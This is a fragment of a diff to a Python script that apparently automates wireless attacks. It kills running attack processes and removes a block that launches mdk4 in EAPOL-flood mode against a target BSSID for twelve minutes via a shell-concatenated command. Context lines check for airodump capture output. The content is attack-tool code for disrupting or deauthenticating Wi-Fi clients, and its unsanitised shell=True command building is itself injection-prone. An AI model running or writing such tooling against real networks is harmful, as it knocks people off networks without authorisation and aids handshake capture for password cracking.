@@ -36,15 +36,6 @@ time.sleep(720)
 os.kill(aicinqg.pid, signal.SIGINT)
 os.kill(deauthcinqg.pid, signal.SIGINT)
 
-time.sleep(20)
-
-deauthcinqg = subprocess.Popen("xterm -e mdk4" + " " + cinqg + " " + "e -t" + " " + bssidf + " " + "-l", shell=True)
-try:
- deauthcinqg.wait(timeout=720)
-except subprocess.TimeoutExpired:
-    deauthcinqg.terminate()
-deauthcinqg.send_signal(subprocess.signal.SIGTERM)
-
 def airodumpcheckcinqg():
     print("")
     if os.path.isfile('airodumpencours.txt'):
